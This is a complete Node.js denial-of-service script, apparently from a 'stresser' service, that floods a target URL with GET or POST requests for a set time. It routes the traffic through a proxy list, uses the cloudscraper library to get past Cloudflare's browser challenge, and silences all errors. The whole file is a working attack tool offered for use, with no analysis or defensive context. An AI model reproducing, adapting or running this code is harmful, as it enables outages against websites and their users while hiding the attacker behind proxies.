require('events').EventEmitter.defaultMaxListeners = 0;
const fs = require('fs'),
    CloudScraper = require('cloudscraper'),
    path = require('path');

if (process.argv.length !== 7) {
    console.log(`
Usage: node ${path.basename(__filename)} <url> <time> <req_per_ip> <proxies> <reqtype>
Example: node ${path.basename(__filename)} <http://example.com> <60> <100> <proxy.txt> <GET/POST>`);
    process.exit(0);
}

const target = process.argv[2],
    time = process.argv[3],
    req_per_ip = process.argv[4],
    reqtype = process.argv[6];

    const proxies = fs.readFileSync(process.argv[5], 'utf-8').replace(/\r/g, '').split('\n');

function send_req() {
    let proxy = proxies[Math.floor(Math.random() * proxies.length)];

    let getHeaders = new Promise(function (resolve, reject) {
        CloudScraper({
            uri: target,
            resolveWithFullResponse: true,
            proxy: 'http://' + proxy,
            challengesToSolve: 1
        }, function (error, response) {
            resolve(response.request.headers);
        });
    });

    getHeaders.then(function (result) {
        // Object.keys(result).forEach(function (i, e) {
        //     console.log(i + ': ' + result[i]);
        // });
        for (var i = 0; i < req_per_ip; i++) {
            let proxy = proxies[Math.floor(Math.random() * proxies.length)];
            CloudScraper({
                method: reqtype,
                uri: target,
                headers: result,
                proxy: 'http://' + proxy,
                followAllRedirects: true
            }, function (error, response) {
                if (error) {
                    //console.log(error.message);
                }
            });
        }
    });
}

setInterval(() => {
    send_req();
});

setTimeout(() => {
	console.log('Script by xr4zz3rs - RealStreser');
    console.log('Attack ended.');
    process.exit(0);
}, time * 1000);

// to avoid errors
process.on('uncaughtException', function (err) {
    // console.log(err);
});
process.on('unhandledRejection', function (err) {
    // console.log(err);
});
